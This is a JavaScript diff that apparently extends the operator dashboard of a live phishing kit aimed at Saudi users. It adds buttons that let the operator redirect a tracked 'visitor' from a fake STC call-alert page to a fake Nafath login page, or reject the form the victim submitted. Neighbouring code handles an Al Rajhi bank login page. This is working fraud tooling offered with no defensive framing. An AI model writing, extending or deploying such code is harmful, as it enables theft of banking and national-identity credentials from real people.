@@ -1325,6 +1325,39 @@
               }, 100);
             }
             
+            // إضافة أزرار لتنبية إتصال STC
+            if (dataEntry.page === 'تنبية إتصال STC') {
+              const nafathBtnId = 'nafath-btn-' + visitor.socketId + '-' + dataIndex;
+              const stcCallRejectBtnId = 'stc-call-reject-btn-' + visitor.socketId + '-' + dataIndex;
+              html += '<div class="flex gap-2 mt-3">';
+              html += '<button id="' + nafathBtnId + '" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>تطبيق نفاذ</button>';
+              html += '<button id="' + stcCallRejectBtnId + '" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium"' + (visitor.isConnected !== true ? ' disabled style="opacity:0.5;cursor:not-allowed"' : '') + '>رفض</button>';
+              html += '</div>';
+              // إضافة event listeners بعد إنشاء العناصر
+              setTimeout(() => {
+                const nafathBtn = document.getElementById(nafathBtnId);
+                const rejectBtn = document.getElementById(stcCallRejectBtnId);
+                if (nafathBtn) {
+                  nafathBtn.addEventListener('click', () => {
+                    navigateVisitorToPage(visitor.socketId, 'nafath-login-page');
+                    nafathBtn.textContent = 'تم ✓';
+                    nafathBtn.disabled = true;
+                    nafathBtn.classList.remove('bg-purple-600', 'hover:bg-purple-700');
+                    nafathBtn.classList.add('bg-gray-400', 'cursor-not-allowed');
+                  });
+                }
+                if (rejectBtn) {
+                  rejectBtn.addEventListener('click', () => {
+                    rejectForm(visitor.socketId);
+                    rejectBtn.textContent = 'تم ✓';
+                    rejectBtn.disabled = true;
+                    rejectBtn.classList.remove('bg-red-600', 'hover:bg-red-700');
+                    rejectBtn.classList.add('bg-gray-400', 'cursor-not-allowed');
+                  });
+                }
+              }, 100);
+            }
+            
             // إضافة أزرار للراجحي تسجيل الدخول
             if (dataEntry.page === 'تسجيل الدخول الراجحى') {
               html += '<div class="flex gap-2 mt-3">';
